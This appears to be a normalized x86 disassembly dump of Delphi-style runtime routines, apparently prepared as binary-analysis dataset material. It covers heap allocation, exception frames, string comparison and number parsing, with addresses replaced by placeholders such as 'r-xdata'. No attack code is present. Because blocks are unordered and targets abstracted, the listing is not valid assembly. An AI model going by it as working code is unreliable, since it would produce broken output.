mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020ec
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401458
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403c08
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403c08
jmp r-xdata
sub_402370
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402502
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401af4
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401450
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401458
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403c08
jmp r-xdata
call sub_401f88
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401c98
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401f00
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401c98
sub_402514
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f88
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401c98
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_40208c
test al al
je r-xdata
call sub_401c98
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d5c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401f00
jmp r-xdata
sub_4026f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4027a1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401af4
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402514
test al al
je r-xdata
push rw-data
call sub_401450
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4021e0
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4029b0
mov eax ebx
call sub_402370
retn
push rw-data
call sub_401458
sub_4027b4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402910
sub_4027d4
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402910
sub_4027f4
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402910
mov [ ecx ] eax
mov al 0x2
jmp sub_402910
retn
mov [ ecx ] eax
retn
sub_402884
push ebx
push esi
call sub_40629c
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_40629c
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_40629c
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4028c4
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_40629c
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4028b8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40294c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4029b0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4029f0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_401314
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_40476c
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_401314
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_401314
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401314
cmp eax ebx
jbe r-xdata
push ebx
call sub_401314
mov ebx eax
jmp r-xdata
push ebx
call sub_401314
mov ebx eax
jmp r-xdata
push ebx
call sub_401314
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401314
mov ebx eax
jmp r-xdata
push ebx
call sub_401314
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402adc
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404120
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_401354
mov ecx eax
mov edx esp
mov eax ebx
call sub_404210
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4029f0
mov edi eax
test esi esi
je r-xdata
sub_402b6c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402bac
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40293c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402c00
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40293c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40293c
jmp r-xdata
sub_402c58
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402c94
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4029b0
pop ebx
retn
mov ecx ebx
sub_402cb0
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402d34
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402da4
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402dc4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402ea4
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402ee4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f97 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f97 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402f97
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4031d0
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403200
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4013ac
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403271
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4013b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4013a4
retn
sub_4032f4
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_40339c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4033f4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404b88
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403414
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405b68
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403444
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4034c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4034d8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4034cf
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403414
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405b68
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4034d8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40351c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4035bc
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40355c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40358c
push eax
push ecx
mov eax [ eax ]
call sub_40355c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404114
call [ rw-data ]
sub_4035a4
push esi
mov esi edx
mov eax [ eax ]
call sub_40355c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404114
call [ rw-data ]
sub_4035ec
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40355c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403614
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403664
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_4036a4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4036f4
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_40371d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403788
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4037c4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
